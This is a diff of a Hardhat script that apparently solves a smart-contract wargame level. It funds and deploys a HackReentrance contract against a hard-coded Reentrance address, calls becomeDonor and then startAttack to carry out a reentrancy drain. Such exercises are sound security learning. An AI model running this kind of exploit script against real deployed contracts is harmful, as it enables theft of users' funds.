@@ -9,13 +9,13 @@ const main = async () => {
   console.log(`Reentrance contract: ${reentranceContract.address}`);
 
   const hackReentranceFactory = await hre.ethers.getContractFactory("HackReentrance");
-  const hackReentranceContract = await hackReentranceFactory.deploy("0x311Dda1bD3289a11dBECA53f0103631a9AcdF24C", /*{value: (hre.ethers.utils.parseUnits("1.0"))}*/);
+  const hackReentranceContract = await hackReentranceFactory.deploy("0x311Dda1bD3289a11dBECA53f0103631a9AcdF24C", {value: (hre.ethers.utils.parseUnits("1.0"))});
   await hackReentranceContract.deployed();
   console.log(`HackReentrance contract: ${hackReentranceContract.address}`)
 
-  //let txn = await hackReentranceContract.becomeDonor();
+  let txn = await hackReentranceContract.becomeDonor();
   console.log("Donating...")
-  //await txn.wait();
+  await txn.wait();
   console.log("Donation complete.");
   let txn2 = await hackReentranceContract.startAttack();
   console.log("Initiating reentrance...");
